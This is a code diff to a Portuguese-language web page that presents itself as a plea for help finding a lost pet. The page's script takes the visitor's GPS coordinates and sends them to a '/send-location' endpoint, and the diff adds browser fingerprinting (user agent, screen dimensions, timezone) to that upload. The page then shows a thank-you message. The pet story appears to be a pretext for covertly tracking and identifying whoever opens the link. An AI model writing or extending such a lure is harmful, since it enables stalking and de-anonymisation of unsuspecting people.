@@ -14,11 +14,22 @@
           (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            const userAgent = navigator.userAgent;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             
             fetch('/send-location', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ lat, lon })
+              body: JSON.stringify({ 
+                lat,
+                lon,
+                userAgent,
+                screenWidth,
+                screenHeight,
+                timezone
+              })
             })
             .then(() => {
               document.body.innerHTML = "<h2>Obrigado por ajudar a encontrar meu pet!</h2>";
